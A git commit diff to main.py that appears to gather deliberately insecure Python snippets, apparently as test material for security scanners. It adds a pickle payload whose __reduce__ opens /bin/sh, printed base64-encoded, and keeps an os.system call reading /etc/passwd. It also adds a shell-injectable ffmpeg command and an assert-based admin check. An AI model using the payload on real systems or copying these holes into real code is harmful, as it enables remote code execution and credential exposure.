127145fc3e70e0981a53265f1efbdaf991c96164
Igor <45092677+fhause5@users.noreply.github.com>
2021-01-22 14:33:36 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,5 +1,15 @@
 import os
 import sys
+import subprocess
+import cPickle
+import subprocess
+import base64
+
+class RunBinSh(object):
+  def __reduce__(self):
+    return (subprocess.Popen, (('/bin/sh',),))
+
+print base64.b64encode(cPickle.dumps(RunBinSh()))
 
 os.system('cat /etc/passwd')
 #del sys.modules['milicious']
@@ -7,3 +17,12 @@ os.system('cat /etc/passwd')
 def get_client(user):
     if not is_superuser(user):
         raise PermissionError
+
+
+def transcode_file(request, filename):
+    command = 'ffmpeg -i "{source}" output_file.mpg'.format(source=filename)
+    subprocess.call(command, shell=True)  # a bad idea!
+    
+def foo(request, user):
+   assert user.is_admin, “user does not have access”
+   # secure code...
